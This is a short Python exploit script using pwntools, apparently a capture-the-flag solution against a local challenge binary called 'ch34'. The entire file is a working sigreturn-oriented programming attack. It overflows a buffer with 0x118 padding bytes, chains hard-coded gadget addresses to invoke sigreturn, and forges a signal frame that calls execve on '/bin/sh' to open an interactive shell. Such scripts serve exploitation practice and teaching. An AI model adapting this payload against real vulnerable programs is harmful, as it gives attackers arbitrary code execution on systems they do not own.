from pwn import*

p = process("./ch34")
context.arch = 'amd64'
gdb.attach(p, api=True)

rax = 0x000000000044d2b4
syscall = 0x0000000000400488
binsh = 0x4aa2cd
ret = 0x00000000004002c9

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rip = syscall
frame.rsi = 0
payload = b"a"*0x118 + p64(ret) + p64(rax) + p64(0xf) + p64(syscall) + bytes(frame)

p.sendline(payload)
p.interactive()
#0x00000000004010ec
